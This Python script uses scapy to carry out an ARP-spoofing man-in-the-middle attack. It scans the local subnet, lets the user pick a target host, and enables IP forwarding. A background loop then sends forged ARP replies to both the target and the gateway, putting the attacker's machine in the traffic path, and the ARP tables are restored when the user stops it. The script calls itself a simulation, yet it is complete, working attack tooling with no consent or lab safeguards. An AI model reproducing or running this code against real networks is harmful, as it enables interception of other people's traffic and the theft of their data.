import scapy.all as scapy
from netfilterqueue import NetfilterQueue
from colorama import Fore, Style, init
import os
import threading
import sys
import time

# Initialize colorama for colored terminal output
init(autoreset=True)

# --- Global State ---
IP_FORWARDING_ENABLED = False
# A flag to stop the spoofing thread gracefully
stop_spoofing_event = threading.Event()

def get_mac(ip_address):
    """
    Get MAC address from IP using an ARP request.
    This is a helper function to discover device MACs on the network.
    """
    try:
        # Create an ARP request packet
        arp_request = scapy.ARP(pdst=ip_address)
        # Broadcast the packet to all devices
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        # Send the packet and wait for a response
        answered, _ = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)
        
        if answered:
            return answered[0][1].hwsrc
    except Exception as e:
        print(f"{Fore.RED}Error getting MAC for {ip_address}: {e}{Style.RESET_ALL}")
    return None

def scan_network(router_ip):
    """
    Scan the subnet for active devices.
    """
    print(f"{Fore.CYAN}\n[+] Scanning network for connected devices...{Style.RESET_ALL}")
    arp = scapy.ARP(pdst=f"{router_ip}/24")
    ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp

    devices = []
    # Send the packet and wait for responses with a timeout
    answered, _ = scapy.srp(packet, timeout=3, verbose=0)

    for sent, received in answered:
        devices.append({"ip": received.psrc, "mac": received.hwsrc})

    return devices

def spoof(target_ip, spoof_ip, target_mac):
    """
    Sends a spoofed ARP response to the target_ip,
    telling it that the spoof_ip (gateway) has a different MAC address.
    """
    # Create an ARP response packet (is-at)
    # op=2 means ARP response
    # pdst=target_ip is the victim's IP
    # hwdst=target_mac is the victim's MAC
    # psrc=spoof_ip is the IP we are impersonating (the gateway)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(target_ip, gateway_ip, target_mac, gateway_mac):
    """
    Restores the ARP tables of the target and gateway to their original state.
    """
    # Send an ARP response to the target with the correct gateway MAC
    target_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    scapy.send(target_packet, verbose=False, count=4)
    
    # Send an ARP response to the gateway with the correct target MAC
    gateway_packet = scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac)
    scapy.send(gateway_packet, verbose=False, count=4)

def enable_ip_forwarding():
    """
    Enables IP forwarding on the system to allow packets to pass through.
    """
    global IP_FORWARDING_ENABLED
    try:
        # Check the OS to use the correct command
        if sys.platform == 'linux':
            os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        else:
            print(f"{Fore.YELLOW}IP forwarding not supported on this OS. Skipping...{Style.RESET_ALL}")
            return False
        print(f"{Fore.GREEN}IP forwarding enabled.{Style.RESET_ALL}")
        IP_FORWARDING_ENABLED = True
        return True
    except Exception as e:
        print(f"{Fore.RED}Failed to enable IP forwarding: {e}{Style.RESET_ALL}")
        IP_FORWARDING_ENABLED = False
        return False

def disable_ip_forwarding():
    """
    Disables IP forwarding on the system.
    """
    global IP_FORWARDING_ENABLED
    try:
        if IP_FORWARDING_ENABLED:
            if sys.platform == 'linux':
                os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
                print(f"{Fore.GREEN}IP forwarding disabled.{Style.RESET_ALL}")
            IP_FORWARDING_ENABLED = False
    except Exception as e:
        print(f"{Fore.RED}Failed to disable IP forwarding: {e}{Style.RESET_ALL}")

def arp_spoof_loop(target_ip, gateway_ip, target_mac, gateway_mac):
    """
    The main loop for the ARP spoofing thread.
    Continuously sends spoofed ARP packets until the stop event is set.
    """
    while not stop_spoofing_event.is_set():
        spoof(target_ip, gateway_ip, target_mac)
        spoof(gateway_ip, target_ip, gateway_mac)
        time.sleep(2) # Send spoofed packets every 2 seconds

def start_mitm_attack():
    """
    Main function to start the Man-in-the-Middle attack simulation.
    """
    # Clear terminal
    os.system('cls' if os.name == 'nt' else 'clear')
    
    print(f"{Fore.YELLOW}{Style.BRIGHT}Man-in-the-Middle Attack Simulation{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'-'*50}{Style.RESET_ALL}")

    # Root privileges check
    if os.geteuid() != 0:
        print(f"{Fore.RED}This script requires root privileges. Please run with sudo.{Style.RESET_ALL}")
        return

    # Auto-detect gateway and local IP
    try:
        # Find the default gateway IP using scapy
        gateway_ip = scapy.conf.route.route("0.0.0.0")[2]
        if not gateway_ip:
            raise Exception("Could not detect gateway IP.")
        
        # Get the IP of the local machine from the gateway
        local_ip = scapy.conf.route.route(gateway_ip)[1]
        
        print(f"[+] Detected local interface IP: {Fore.GREEN}{local_ip}{Style.RESET_ALL}")
        print(f"[+] Detected gateway IP: {Fore.GREEN}{gateway_ip}{Style.RESET_ALL}")
        
    except Exception as e:
        print(f"{Fore.RED}Error detecting gateway IP: {e}{Style.RESET_ALL}")
        return

    devices = scan_network(gateway_ip)
    if not devices:
        print(f"{Fore.RED}No devices found on the network. Exiting.{Style.RESET_ALL}")
        return

    print(f"\n{Fore.YELLOW}Discovered hosts:{Style.RESET_ALL}")
    # Print the discovered devices
    for idx, device in enumerate(devices, 1):
        print(f"{Fore.CYAN}[{idx}] IP: {device['ip']}, MAC: {device['mac']}{Style.RESET_ALL}")

    try:
        choice = int(input(f"{Fore.YELLOW}Select target device by number: {Style.RESET_ALL}"))
        if choice < 1 or choice > len(devices):
            print(f"{Fore.RED}Invalid choice.{Style.RESET_ALL}")
            return
    except ValueError:
        print(f"{Fore.RED}Invalid input.{Style.RESET_ALL}")
        return

    target_ip = devices[choice-1]['ip']
    target_mac = devices[choice-1]['mac']
    gateway_mac = get_mac(gateway_ip)

    if not gateway_mac:
        print(f"{Fore.RED}Could not find gateway MAC address. Exiting.{Style.RESET_ALL}")
        return
        
    if not enable_ip_forwarding():
        return

    # Start the ARP spoofing in a background thread
    spoof_thread = threading.Thread(
        target=arp_spoof_loop, 
        args=(target_ip, gateway_ip, target_mac, gateway_mac)
    )
    stop_spoofing_event.clear()
    spoof_thread.daemon = True
    spoof_thread.start()
    
    print(f"\n{Fore.GREEN}Starting MitM attack between {target_ip} and {gateway_ip}... Press Ctrl+C to stop.{Style.RESET_ALL}")
    
    try:
        # The main thread can be used for sniffing or other tasks
        # For this example, we simply wait for the user to stop the script
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{Fore.GREEN}Restoring ARP tables...{Style.RESET_ALL}")
        # Stop the spoofing thread
        stop_spoofing_event.set()
        # Ensure the thread has finished its last packet send
        spoof_thread.join(timeout=3)
        # Restore the ARP tables
        restore(target_ip, gateway_ip, target_mac, gateway_mac)
        restore(gateway_ip, target_ip, gateway_mac, target_mac)
        print(f"{Fore.GREEN}ARP tables restored.{Style.RESET_ALL}")

    finally:
        disable_ip_forwarding()
        print(f"{Fore.CYAN}Exiting.{Style.RESET_ALL}")
